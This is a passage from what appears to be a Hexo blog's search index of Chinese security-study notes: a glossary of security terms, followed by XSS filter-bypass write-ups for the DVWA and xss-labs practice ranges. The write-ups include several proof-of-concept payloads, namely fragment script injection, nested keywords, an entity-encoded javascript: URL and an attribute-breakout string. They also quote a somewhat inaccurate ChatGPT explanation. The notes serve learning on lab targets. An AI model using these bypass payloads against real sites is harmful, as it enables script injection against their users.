<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安全术语</title>
      <link href="/2023/04/22/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86_%E5%AE%89%E5%85%A8%E6%9C%AF%E8%AF%AD/"/>
      <url>/2023/04/22/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86_%E5%AE%89%E5%85%A8%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="安全术语"><a href="#安全术语" class="headerlink" title="安全术语"></a>安全术语</h1><hr><h2 id="漏洞利用术语"><a href="#漏洞利用术语" class="headerlink" title="漏洞利用术语"></a>漏洞利用术语</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><blockquote><p>POC（Proof of Concept）：概念验证，用于验证安全漏洞是否存在，能否被利用。</p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>EXP(Exploit)：漏洞利用，代表一段有漏洞利用价值的攻击代码或一个漏洞利用过程</p></blockquote><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><blockquote><p>Payload：攻击载荷，通常是指Exploit拿下目标之后，攻击者在目标机器上执行的定制代码或程序，包括执行系统命令、建立会话。</p></blockquote><h3 id="安全漏洞生命周期三个阶段："><a href="#安全漏洞生命周期三个阶段：" class="headerlink" title="安全漏洞生命周期三个阶段："></a>安全漏洞生命周期三个阶段：</h3><blockquote><ul><li><p>漏洞被发现</p></li><li><p>漏洞信息被公布</p></li><li><p>漏洞具有官方补丁或修复方案</p></li></ul></blockquote><p>伴生出的概念：</p><blockquote><ul><li>0day，漏洞信息未公布时，此时利用EXP可以通杀。</li><li>1day，漏洞信息被公布，但漏洞没有官方的补丁或修复方案，此时利用EXP可以入侵大部分系统。</li><li>Nday，漏洞已经有补丁，此时利用EXP只能入侵还未及时修复的系统</li></ul></blockquote><h3 id="CVE-CNVD"><a href="#CVE-CNVD" class="headerlink" title="CVE/CNVD"></a>CVE/CNVD</h3><blockquote><p>CVE(Common Vulnerabilities &amp; Exposures): 通用漏洞披露，相当于全球漏洞的百科全书。</p></blockquote><blockquote><p>CNVD全称 国家信息安全漏洞共享平台，是一个国家网络安全漏洞库。收录的各类漏洞会被赋予CNVD编号。</p></blockquote><h3 id="Shell-Webshell"><a href="#Shell-Webshell" class="headerlink" title="Shell/Webshell"></a>Shell/Webshell</h3><blockquote><p>shell是一个应用程序。它连接了用户和Linux内核，让用户能高效使用Linux内核。</p></blockquote><blockquote><p>webshell 是以asp、php、jsp、cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。</p></blockquote><hr><h2 id="基础设施术语"><a href="#基础设施术语" class="headerlink" title="基础设施术语"></a>基础设施术语</h2><h3 id="c2服务器"><a href="#c2服务器" class="headerlink" title="c2服务器"></a>c2服务器</h3><blockquote><p>c2服务器：command and control server 命令和控制服务器。 可以理解为攻击者发送控制命令的服务端</p></blockquote><h3 id="内、外网"><a href="#内、外网" class="headerlink" title="内、外网"></a>内、外网</h3><blockquote><ul><li>内网：企业内网、局域网。 外部用户无法直接访问</li><li>外网： 常指互联网</li></ul></blockquote><h3 id="DMZ区"><a href="#DMZ区" class="headerlink" title="DMZ区"></a>DMZ区</h3><blockquote><p>内网中的一个特殊区域         隔离区</p><p>可以理解为对外服务区，如网站、论坛等。为保证安全性，会通过防火墙将内、外网、DMZ，进行安全隔离</p><p>外网用户可以直接访问</p></blockquote><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><blockquote><p>Proxy      常用于身份隐藏、端口转发等</p><ul><li>身份隐藏： 攻击者可以通过第三方代理服务器访问目标系统，从而隐藏自己的真实ip，让别人找不到自己。</li><li>端口转发： 可以通过代理软件穿透内网限制，访问核心内网服务器。</li></ul></blockquote><hr><h2 id="攻击面术语"><a href="#攻击面术语" class="headerlink" title="攻击面术语"></a>攻击面术语</h2><p>从攻击者攻击角度的不同，可以划分为</p><ul><li><p>互联网链路攻击</p><blockquote><p>所有暴露的互联网应用： web服务器、数据库服务器、各端口开放服务</p></blockquote></li><li><p>社会工程学攻击</p><blockquote><p>鱼叉攻击、鲸钓攻击、水坑攻击</p></blockquote></li><li><p>近源攻击</p><blockquote><p>USB攻击、Wi-Fi攻击、门禁攻击</p></blockquote></li><li><p>供应链攻击</p><blockquote><p>合作伙伴、供应商（假设a公司使用b公司的产品，但是b公司的产品有漏洞。那么可以利用b公司产品的漏洞攻击a公司。）</p></blockquote></li></ul><hr><h2 id="攻击活动术语"><a href="#攻击活动术语" class="headerlink" title="攻击活动术语"></a>攻击活动术语</h2><h3 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h3><blockquote><p>APT： 高级持续性威胁，通常指处于政治或商业动机，针对特定目标进行的手段高超、低调隐蔽、时间持久、精心策划的攻击。</p></blockquote><p>如美国震网病毒攻击伊朗铀浓缩设备</p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><blockquote><p>是指受信任的第三方通过模拟黑客的攻击技术与手段，对目标网络、系统进行攻击测试，发现安全隐患并给出安全加固建议的一种安全测试和评估方法。</p></blockquote><hr><h2 id="攻击手段术语"><a href="#攻击手段术语" class="headerlink" title="攻击手段术语"></a>攻击手段术语</h2><h3 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h3><blockquote><p>攻击者利用漏洞（如sql注入）入侵网站将数据库拖出到黑客本地服务器的过程</p></blockquote><h3 id="洗库"><a href="#洗库" class="headerlink" title="洗库"></a>洗库</h3><blockquote><p>攻击者“洗”出账号的价值，如果是金融账号则财产转移，如果是游戏账号则盗卖道具或虚拟货币</p></blockquote><h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h3><blockquote><p>攻击者将其收集到的数据库（社工库），制作成相应的（账号密码）字典表，之后尝试批量登录其他网站，“撞”出可以登录使用的账号。</p></blockquote><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><blockquote><p>拒绝服务攻击，利用网络协议缺陷进行攻击，会使服务器或网络无法提供正常的服务。</p></blockquote><h3 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h3><blockquote><p>利用控制成百上千台肉鸡（傀儡机），组成一个攻击群，在同一时刻对目标主机发起攻击。</p><p>主要分为两大类：</p><ul><li>带宽消耗型攻击，如UDP泛洪攻击</li><li>资源消耗型攻击，如cc攻击（发送大量HTTP请求</li></ul></blockquote><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><blockquote><p>是一门艺术。</p><p> 利用人的粗心、轻信、疏忽和警惕性不高来操纵其执行预期的动作或泄露机密信息。</p></blockquote><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><blockquote><p>入侵者采用社会工程学方法，伪装成可以信任的人或机构，通过高仿网站、欺诈邮件、虚假短信方式，引诱受害者浏览、下载、安装、执行，最终实现对目标对象的入侵和控制。</p></blockquote><p>可分为：</p><ul><li><p>鱼叉攻击</p><blockquote><p>一种精确的钓鱼攻击，对特定某个人或某类人</p></blockquote></li><li><p>鲸钓攻击</p><blockquote><p>目标是钓一个十分重要的人（大鱼，某企业高管）。</p></blockquote></li><li><p>水坑攻击</p><blockquote><p>特地挖一个水坑，等人跳进来。 </p><p>如某类人玩游戏特别菜，想开某种外挂，黑客利用这种心理，开发外挂并植入特洛伊木马。当人运行外挂时，黑客就能通过木马控制目标的机器了。</p></blockquote></li></ul><p>等方式</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><blockquote><p>通过伪造或者控制一个服务流程中某台重要的中间设备，把请求服务的一方引导至错误的方向，导致其收到伪造的响应。</p><p>如： 劫持dns服务器，向请求访问某域名用户主机发送错误的ip地址，将其引导至自己建立的假的目标服务器。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> 安全基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于锚点注入的深入探讨</title>
      <link href="/2023/04/21/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E5%85%B3%E4%BA%8E%E9%94%9A%E7%82%B9%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%AE%A8/"/>
      <url>/2023/04/21/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E5%85%B3%E4%BA%8E%E9%94%9A%E7%82%B9%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="关于锚点注入的深入探讨"><a href="#关于锚点注入的深入探讨" class="headerlink" title="关于锚点注入的深入探讨"></a>关于锚点注入的深入探讨</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>dvwa靶场  high难度下的 dom型XSS关卡的解法很有意思</p><p>这关使用了锚点注入的方式，通过在URL后面添加#和script标签，就能使浏览器执行脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204911747.png" alt="image-20230413204911747"></p><p>以下是chatGPT对锚点注入的解释：</p><blockquote><p>锚点注入： 在URL的井号后面添加JavaScript脚本是一种称为“锚点注入”的技术，它可以实现在页面加载时执行JavaScript代码。但是，这种技术并不是所有浏览器都支持，而且也存在一些安全风险。</p><p>如果浏览器支持锚点注入，那么在URL的井号后面添加JavaScript脚本是可以运行的。例如，以下URL会在页面加载时弹出一个警告框：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.html#&lt;script&gt;alert(&#x27;Hello, world!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>但是，为了保证网站的安全性，大多数现代浏览器已经禁止了锚点注入这种技术。因此，不建议在URL中使用锚点注入来执行JavaScript代码，而应该使用更安全的方法，如在HTML文档中嵌入JavaScript代码或在外部JavaScript文件中编写代码。</p></blockquote><p>关键： 在井号后面添加javascript脚本</p><p>我当时心想，这么有意思？那么是不是在其他地方也能这么弄? 只需要在URL后面添加上# 和script标签，就能简单实现XSS攻击</p><p>后来，我在反射型的XSS靶场试了一遍，不成功。在存储型的XSS靶场也试了一遍，照样不成功。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230421001044917.png" alt="image-20230421001044917"></p><p>没有任何反应。。。。</p><h2 id="问题解决过程"><a href="#问题解决过程" class="headerlink" title="问题解决过程"></a>问题解决过程</h2><p>注意到只有DOM型的XSS靶场才可能用这种方法成功通关，而反射型和存储型的全部失败</p><p>那么问题可能就出在不同类型XSS的原理上</p><p>回顾DOM型XSS和反射型XSS攻击原理</p><p>DOM型XSS:</p><blockquote><p>DOM型XSS漏洞是由于JavaScript代码直接操作了DOM（文档对象模型）而导致的漏洞</p></blockquote><p>反射型XSS:</p><blockquote><p>在反射型XSS攻击中，攻击者需要诱导受害者点击一个带有恶意代码的链接，然后受害者的浏览器会向服务器发送请求，将恶意代码作为参数传递给服务器，服务器再将恶意代码反射回受害者的浏览器执行。</p></blockquote><p>也就是说：</p><p>DOM型XSS攻击是客户端通过JavaScript脚本直接将恶意代码插入html页面中的。</p><p>而反射型XSS是等待服务端对请求进行处理，在发送回响应页面。恶意代码实际上是由服务器端插入到html页面中的。</p><p>STFW</p><blockquote><p>由于反射型XSS漏洞是在后端执行的，因此使用锚点来实现攻击可能会失败，因为浏览器可能会对URL中的锚点进行过滤或忽略，而不会执行其中的JavaScript代码。</p></blockquote><p>至此，问题解决</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>锚点注入是个好东西，但是只能运用在存在DOM型XSS漏洞的场景。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用姿势总结</title>
      <link href="/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS实用绕过姿势总结"><a href="#XSS实用绕过姿势总结" class="headerlink" title="XSS实用绕过姿势总结"></a>XSS实用绕过姿势总结</h1><h2 id="1-嵌套字符以应对字符删除型过滤"><a href="#1-嵌套字符以应对字符删除型过滤" class="headerlink" title="1.  嵌套字符以应对字符删除型过滤"></a>1.  嵌套字符以应对字符删除型过滤</h2><p>如：xss-labs-master  level7</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113233600.png" alt="image-20230418113233600"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113429060.png" alt="image-20230418113429060"></p><p>此处直接删除了字符script和href</p><p>可以采用嵌套的方式绕过</p><blockquote><ul><li>hhrefref</li><li>sscriptcript</li></ul></blockquote><p>此时，只会删除掉特定的连续字符串，但是剩下的字符又会重新组合成这个字符串，达成绕过的目的。</p><hr><h2 id="2-尝试使用锚点注入的方式绕过（不一定会成功）"><a href="#2-尝试使用锚点注入的方式绕过（不一定会成功）" class="headerlink" title="2.  尝试使用锚点注入的方式绕过（不一定会成功）"></a>2.  尝试使用锚点注入的方式绕过（不一定会成功）</h2><blockquote><p>锚点注入： 在URL的井号后面添加JavaScript脚本是一种称为“锚点注入”的技术，它可以实现在页面加载时执行JavaScript代码。但是，这种技术并不是所有浏览器都支持，而且也存在一些安全风险。</p><p>如果浏览器支持锚点注入，那么在URL的井号后面添加JavaScript脚本是可以运行的。例如，以下URL会在页面加载时弹出一个警告框：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.html#&lt;script&gt;alert(&#x27;Hello, world!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>但是，为了保证网站的安全性，大多数现代浏览器已经禁止了锚点注入这种技术。因此，不建议在URL中使用锚点注入来执行JavaScript代码，而应该使用更安全的方法，如在HTML文档中嵌入JavaScript代码或在外部JavaScript文件中编写代码。</p></blockquote><p>例：dvwa  DOM型XSS  level high</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413193725293.png" alt="image-20230413193725293"></p><p>这里对url中的字符进行了严密的过滤，但是没有过滤掉  ‘#‘</p><p>在URL最后添加上#和脚本语句</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204911747.png" alt="image-20230413204911747"></p><p>发现弹窗了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413205049632.png" alt="image-20230413205049632"></p><p>检查网页，发现选项English部分的下面多了script标签（）</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420231507666.png"></p><h2 id="3-script标签被截断的应对方法-如截断成s-cript"><a href="#3-script标签被截断的应对方法-如截断成s-cript" class="headerlink" title="3. script标签被截断的应对方法 如截断成s_cript"></a>3. script标签被截断的应对方法 如截断成s_cript</h2><p>比较简单，不放图举例了</p><blockquote><ul><li>大小写绕过</li><li>使用img标签</li><li>使用a标签</li><li>给该文本框或下拉列表添加事件属性</li></ul></blockquote><hr><h2 id="4-存储型XSS限制输入字符个数的应对方法"><a href="#4-存储型XSS限制输入字符个数的应对方法" class="headerlink" title="4.  存储型XSS限制输入字符个数的应对方法"></a>4.  存储型XSS限制输入字符个数的应对方法</h2><p>存储型，目的是把脚本存入服务器数据库里</p><p>此时可以通过用浏览器检查功能修改标签的限制属性，再往里边写代码</p><p>例：dvwa存储型XSS</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416153751520.png" alt="image-20230416153751520"></p><blockquote><p>存储型，注意到有两个文本框，一个是姓名，一个是评论消息。</p><p>可能只对评论信息做了过滤，名字通过前端限制了输入字长，但没做过滤。</p><p>尝试修改名字的限制长度，然后在名字的文本框发脚本。</p></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154209736.png" alt="image-20230416154209736"></p><blockquote><p>改成100，然后痛快地写脚本</p></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154853881.png" alt="image-20230416154853881"></p><hr><h2 id="5-页面回显的字符被转义，而输入框内容未被清空"><a href="#5-页面回显的字符被转义，而输入框内容未被清空" class="headerlink" title="5.  页面回显的字符被转义，而输入框内容未被清空"></a>5.  页面回显的字符被转义，而输入框内容未被清空</h2><p>此时可以推断出输入框value属性的值未被清空，可以使用双引号或单引号闭合value，再添加属性</p><p>例：xss-labs-master  level2</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416163152800.png" alt="image-20230416163152800"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164148387.png" alt="image-20230416164148387"></p><hr><h2 id="6-使用unicode编码绕过"><a href="#6-使用unicode编码绕过" class="headerlink" title="6. 使用unicode编码绕过"></a>6. 使用unicode编码绕过</h2><p>当URL中 script、onclick、href  等特殊字符串被过滤掉时，可以将脚本部分使用unicode编码，再将编码后的字符串填入达成目的。</p><p>例： xss-labs-master  level8</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163308647.png" alt="image-20230420163308647"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163537287.png" alt="image-20230420163537287"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163557363.png" alt="image-20230420163557363"></p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（四）</title>
      <link href="/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS的绕过姿势（四）"><a href="#XSS的绕过姿势（四）" class="headerlink" title="XSS的绕过姿势（四）"></a>XSS的绕过姿势（四）</h1><p>本章重点挑xss-labs-master靶场里一些经典的例子探讨</p><h2 id="level2-闭合文本框"><a href="#level2-闭合文本框" class="headerlink" title="level2  闭合文本框"></a>level2  闭合文本框</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416163152800.png" alt="image-20230416163152800"></p><p>查看网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看的出来 回显的消息被转义了，但是搜索框里的内容还在，看来搜索框是有value属性的</p><p>换思路 提前闭合value属性</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164148387.png" alt="image-20230416164148387"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164202952.png" alt="image-20230416164202952"></p><p>成功</p><hr><h2 id="level5-闭合文本框"><a href="#level5-闭合文本框" class="headerlink" title="level5 闭合文本框"></a>level5 闭合文本框</h2><p>这一关把on开头的字符串全部替换成了 on_ 开头，script标签也替换成了scr_ipt标签</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164916848.png" alt="image-20230416164916848"></p><p>尝试大小写绕过</p><p>失败</p><p>on开头的事件没办法触发了 所以img标签此路不通</p><p>换标签：</p><p>换a标签，a标签里有href属性，在此嵌入脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416165821724.png" alt="image-20230416165821724"></p><p>出现了可以点击的标签，成功</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416165907920.png" alt="image-20230416165907920"></p><hr><h2 id="level7-使用嵌套应对删除字符串的过滤"><a href="#level7-使用嵌套应对删除字符串的过滤" class="headerlink" title="level7 使用嵌套应对删除字符串的过滤"></a>level7 使用嵌套应对删除字符串的过滤</h2><p>测试：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113233600.png" alt="image-20230418113233600"></p><p>发现script 和 href被直接删除了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113429060.png" alt="image-20230418113429060"></p><p>如图 当“href”和“script”标签被过滤删除时，可以使用嵌套的方法绕过。</p><p>如：</p><blockquote><ul><li>hhrefref</li><li>sscriptcript</li></ul></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418112906538.png" alt="image-20230418112906538"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113948585.png" alt="image-20230418113948585"></p><p>成功</p><hr><h2 id="level-8-利用Unicode编码绕过"><a href="#level-8-利用Unicode编码绕过" class="headerlink" title="level 8 利用Unicode编码绕过"></a>level 8 利用Unicode编码绕过</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163308647.png" alt="image-20230420163308647"></p><p>这一关是利用页面特性：在文本框输入url，点击添加友情连接，给下面的超链接href属性赋值</p><p>这一关将常规的xss有关字符都过滤掉了。</p><p>此时可以使用unicode编码进行绕过</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163537287.png" alt="image-20230420163537287"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163557363.png" alt="image-20230420163557363"></p><p>成功。</p><h2 id="level9-添加特定字符串应付检测"><a href="#level9-添加特定字符串应付检测" class="headerlink" title="level9 添加特定字符串应付检测"></a>level9 添加特定字符串应付检测</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420165217760.png" alt="image-20230420165217760"></p><p>这一关会对输入的URL进行检测，若无 ”http://“ 字符串则报错</p><p>可以在编码后的URL后面添加上注释掉的对应字符串进行绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">41</span>;<span class="comment">/* http:// */</span></span><br></pre></td></tr></table></figure><h2 id="level10-对带有隐藏属性的标签要有敏锐的嗅觉"><a href="#level10-对带有隐藏属性的标签要有敏锐的嗅觉" class="headerlink" title="level10 对带有隐藏属性的标签要有敏锐的嗅觉"></a>level10 对带有隐藏属性的标签要有敏锐的嗅觉</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420170220631.png" alt="image-20230420170220631"></p><p>注意到这关的源码有三个被隐藏的input标签：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420170340882.png" alt="image-20230420170340882"></p><p>此时猜测三个标签其中有一个可能使用get方法传值</p><p>此时对input标签一个个测试，尝试使用url改动其属性值，最终发现t_sort属性被修改</p><p>输入payload(因为标签被隐藏，所以需要加上type=“text” 来覆盖后面的隐藏属性)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420171848379.png" alt="image-20230420171848379"></p><hr><p>以上是前十题中的几个典型绕过方式，后十题涉及到一些辅助工具的使用，将在后面补充。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（三）</title>
      <link href="/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS的绕过姿势（三）"><a href="#XSS的绕过姿势（三）" class="headerlink" title="XSS的绕过姿势（三）"></a>XSS的绕过姿势（三）</h1><p>本章提及的几种姿势将在dvwa靶场进行演示</p><h2 id="存储型XSS的绕过姿势"><a href="#存储型XSS的绕过姿势" class="headerlink" title="存储型XSS的绕过姿势"></a>存储型XSS的绕过姿势</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416153751520.png" alt="image-20230416153751520"></p><p>URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_s/</span><br></pre></td></tr></table></figure><h3 id="安全等级：Medium"><a href="#安全等级：Medium" class="headerlink" title="安全等级：Medium"></a>安全等级：Medium</h3><h4 id="猜测与尝试"><a href="#猜测与尝试" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>存储型，注意到有两个文本框，一个是姓名，一个是评论消息。</p><p>可能只对评论信息做了过滤，名字通过前端限制了输入字长，但没做过滤。</p><p>尝试修改名字的限制长度，然后在名字的文本框发脚本。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154209736.png" alt="image-20230416154209736"></p><p>改成100，然后痛快地写脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154341442.png" alt="image-20230416154341442"></p><p>失败：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154409127.png" alt="image-20230416154409127"></p><p>推测可能对script标签做了过滤，老套路，换img</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154853881.png" alt="image-20230416154853881"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154918355.png" alt="image-20230416154918355"></p><p>成功</p><p>尝试以下在评论消息框发同样的脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416155125217.png" alt="image-20230416155125217"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416155137551.png" 